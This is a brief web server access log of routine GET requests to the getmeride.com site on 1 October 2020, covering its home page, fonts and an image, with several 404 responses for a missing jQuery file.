162.158.63.155 - - [01/Oct/2020:23:01:55 +0000] "GET / HTTP/1.1" 200 27291 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0"
162.158.63.197 - - [01/Oct/2020:23:01:55 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36"
108.162.219.67 - - [01/Oct/2020:23:01:55 +0000] "GET /asset/fonts/clan/ClanPro-Book.otf HTTP/1.1" 200 95780 "http://getmeride.com/asset/css/style.css" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36"
162.158.63.227 - - [01/Oct/2020:23:01:56 +0000] "GET /asset/fonts/clan/ClanPro-Medium.otf HTTP/1.1" 200 98116 "http://getmeride.com/asset/css/style.css" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36"
108.162.219.127 - - [01/Oct/2020:23:01:56 +0000] "GET /asset/font-awesome/fonts/fontawesome-webfont.woff2?v=4.4.0 HTTP/1.1" 200 64464 "http://getmeride.com/asset/font-awesome/css/font-awesome.min.css" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36"
162.158.63.197 - - [01/Oct/2020:23:01:56 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0"
162.158.63.197 - - [01/Oct/2020:23:01:57 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36"
172.104.108.109 - - [01/Oct/2020:23:10:26 +0000] "GET / HTTP/1.1" 200 27220 "-" "Mozilla/5.0"
162.158.63.51 - - [01/Oct/2020:23:46:47 +0000] "GET / HTTP/1.1" 200 27291 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/125.2.332137730 Mobile/15E148 Safari/604.1"
162.158.62.48 - - [01/Oct/2020:23:46:47 +0000] "GET /asset/img/destination.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/125.2.332137730 Mobile/15E148 Safari/604.1"
